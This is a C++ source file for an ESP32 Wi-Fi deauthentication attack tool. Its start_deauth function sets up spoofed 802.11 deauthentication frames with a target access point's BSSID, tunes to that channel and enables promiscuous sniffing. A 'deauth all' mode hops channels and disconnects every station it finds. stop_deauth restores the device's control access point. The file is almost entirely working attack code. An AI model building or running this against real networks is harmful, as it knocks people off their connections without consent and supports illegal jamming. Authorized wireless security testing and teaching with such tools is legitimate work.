// Source File: deauth.cpp

#include <Arduino.h>
#include <WiFi.h>      // Needed for WiFi.mode, WiFi.channel, WiFi.BSSID, WiFi.softAP
#include <esp_wifi.h>  // Needed for esp_wifi_set_promiscuous, esp_wifi_set_promiscuous_rx_cb, esp_wifi_set_promiscuous_filter, esp_wifi_set_channel
#include "type.h"
#include "definitions.h"
#include "deauth.h" // Include our own header

// --- External Global Variables (declared in deauth.ino, used here) ---
// Note: These are accessed and modified by functions in this file and deauth.ino
extern deauth_frame_t deauth_frame;
extern int deauth_type;
extern int eliminated_stations;
extern int curr_channel;

// --- External Function and Variable (defined elsewhere, used here) ---
extern IRAM_ATTR void sniffer(void *buf, wifi_promiscuous_pkt_type_t type);
extern const wifi_promiscuous_filter_t filt; // The promiscuous filter

// --- Function Definitions ---

void start_deauth(int network_num, int type, uint16_t reason_code) {
    DEBUG_PRINTF("Starting deauth attack type: %d, reason: %d\n", type, reason_code);

    // Stop any existing Wi-Fi operations (STA or AP) to ensure promiscuous mode works correctly
    // Note: This will stop the SoftAP needed for the web server.
    WiFi.disconnect(true); // Disconnect from any connected network
    WiFi.mode(WIFI_MODE_NULL); // Set mode to null before changing
    delay(100); // Give Wi-Fi a moment to settle

    deauth_type = type; // Set the global deauth type
    eliminated_stations = 0; // Reset station counter

    // Configure the deauth frame fields that are common to both attack types
    // Frame control (0xC000 for deauthentication) is initialized in the global deauth_frame in .ino
    deauth_frame.reason = reason_code;
    // Set a reasonable duration (e.g., 312 microseconds, represented as 0x0138)
    // This value can vary, 0x0138 is common.
    deauth_frame.duration[0] = 0x38;
    deauth_frame.duration[1] = 0x01;
    // fragment_sequence is initialized in the global deauth_frame in .ino

    if (deauth_type == DEAUTH_TYPE_SINGLE) {
        // For single mode, we need the target AP's BSSID and channel
        if (network_num >= 0 && network_num < WiFi.scanComplete()) {
            uint8_t *bssid = WiFi.BSSID(network_num);
            int channel = WiFi.channel(network_num);

            // Copy the target AP's BSSID into the deauth frame's sender and access_point fields
            // These fields represent the Source Address (Addr2) and BSSID (Addr3) of the deauth frame being sent
            memcpy(deauth_frame.sender, bssid, 6);
            memcpy(deauth_frame.access_point, bssid, 6);

            // Set the Wi-Fi channel to the target network's channel
            esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
            DEBUG_PRINTF("Targeting AP: %s on Channel: %d\n", WiFi.BSSIDstr(network_num).c_str(), channel);

            // Set mode to STA for sniffing/TX. Note the conflict with the web server AP.
            WiFi.mode(WIFI_MODE_STA);
            delay(100);

            // Enable promiscuous mode to capture frames (primarily from the target AP)
            esp_wifi_set_promiscuous(true);
            esp_wifi_set_promiscuous_filter(&filt); // Apply the filter for Management and Data frames
            esp_wifi_set_promiscuous_rx_cb(&sniffer); // Register the sniffer callback

             DEBUG_PRINTF("Promiscuous mode started for single deauth.\n");

        } else {
            DEBUG_PRINTF("Error: Invalid network number %d for single deauth.\n", network_num);
            // If invalid network, revert state or indicate error
            deauth_type = DEAUTH_TYPE_NONE; // Revert type
            // Need to restart web server AP here if mode was changed and scan failed
             WiFi.mode(WIFI_MODE_AP);
             WiFi.softAP(AP_SSID, AP_PASS);
             DEBUG_PRINTF("Reverted to AP mode due to invalid network selection.\n");
        }

    } else if (deauth_type == DEAUTH_TYPE_ALL) {
        // For "deauth all" mode, we hop channels and listen for any station traffic
        // The sniffer will identify stations and their APs on the current channel.

        // Set mode to STA for sniffing/TX and channel hopping. Note the conflict with the web server AP.
        WiFi.mode(WIFI_MODE_STA);
         delay(100);


        // Enable promiscuous mode to capture frames
        esp_wifi_set_promiscuous(true);
        esp_wifi_set_promiscuous_filter(&filt); // Apply the filter for Management and Data frames
        esp_wifi_set_promiscuous_rx_cb(&sniffer); // Register the sniffer callback

        curr_channel = 1; // Start channel hopping from channel 1
        DEBUG_PRINTF("Promiscuous mode started for deauth all. Starting channel hopping.\n");

        // Note: The web server is stopped in handle_deauth_all before calling start_deauth(ALL).
        // The loop() in deauth.ino will now handle channel hopping.
    } else {
         DEBUG_PRINTF("Warning: start_deauth called with unknown type %d.\n", type);
         deauth_type = DEAUTH_TYPE_NONE; // Ensure type is none
         // Need to restart web server AP here if mode was changed
          WiFi.mode(WIFI_MODE_AP);
          WiFi.softAP(AP_SSID, AP_PASS);
          DEBUG_PRINTF("Reverted to AP mode due to unknown deauth type.\n");
    }

    // Note on Wi-Fi Mode Conflict:
    // The web server runs on a SoftAP started in setup().
    // start_web_interface (called from setup) also sets mode to STA and disconnects,
    // potentially breaking the initial AP.
    // start_deauth (called from web handlers) also sets mode to STA.
    // stop_deauth needs to restore the AP.
    // This sequence of mode changes is complex and prone to issues.
    // If the web server is intended to run on the SoftAP created in setup(),
    // start_web_interface should probably NOT change the WiFi mode.
    // Similarly, start_deauth changing the mode will stop the web server AP.
    // The current implementation expects stop_deauth to restart the AP.
}

void stop_deauth() {
    if (deauth_type != DEAUTH_TYPE_NONE) {
        DEBUG_PRINTF("Stopping deauth attack.\n");

        // Disable promiscuous mode and unregister the sniffer callback
        esp_wifi_set_promiscuous(false);
        esp_wifi_set_promiscuous_rx_cb(NULL);

        // Reset the deauth type to indicate no attack is active
        deauth_type = DEAUTH_TYPE_NONE;
        eliminated_stations = 0; // Reset counter on stop

        // --- Restore Wi-Fi mode for the Web Server ---
        // This assumes the web server runs on the SoftAP and that start_deauth
        // changed the mode away from SoftAP.
        WiFi.mode(WIFI_MODE_AP);
        // Restart the SoftAP with the defined credentials
        WiFi.softAP(AP_SSID, AP_PASS);

        DEBUG_PRINTF("Deauth stopped. Restored AP mode for web server. IP: ");
        DEBUG_PRINTF("%s\n", WiFi.softAPIP().toString().c_str()); // Print IP as String

        // Note: The handle_stop function in deauth.ino calls server.begin() AFTER stop_deauth().
        // This sequence should allow the web server to resume on the re-established AP.

    } else {
        DEBUG_PRINTF("No deauth attack currently active to stop.\n");
    }
}

// Note: The sniffer function is defined in deauth.ino and is called by the ESP-IDF driver.
// It uses the global deauth_frame, deauth_type, and eliminated_stations variables,
// which are declared extern here and defined in deauth.ino.
// The filt variable is used by start_deauth to configure the filter, and is defined in type.h.
